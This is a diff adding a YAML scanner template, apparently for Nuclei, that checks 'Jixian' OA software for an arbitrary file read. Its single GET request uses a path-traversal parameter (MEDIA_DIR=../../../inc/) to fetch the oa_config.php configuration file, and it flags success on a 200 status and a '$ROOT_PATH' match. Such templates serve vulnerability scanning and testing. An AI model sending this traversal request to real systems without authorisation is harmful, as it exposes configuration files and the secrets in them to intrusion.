@@ -1,0 +1,25 @@
+id: Jixian-Arbitrary-file-read
+
+info:
+  name: Jixian Arbitrary file read
+  author: cr
+  severity: high
+  description: Jixian-Arbitrary-file-read
+  tags: Jixian,file-read
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "$ROOT_PATH"
+        part: body
+
+      - type: status
+        status:
+          - 200
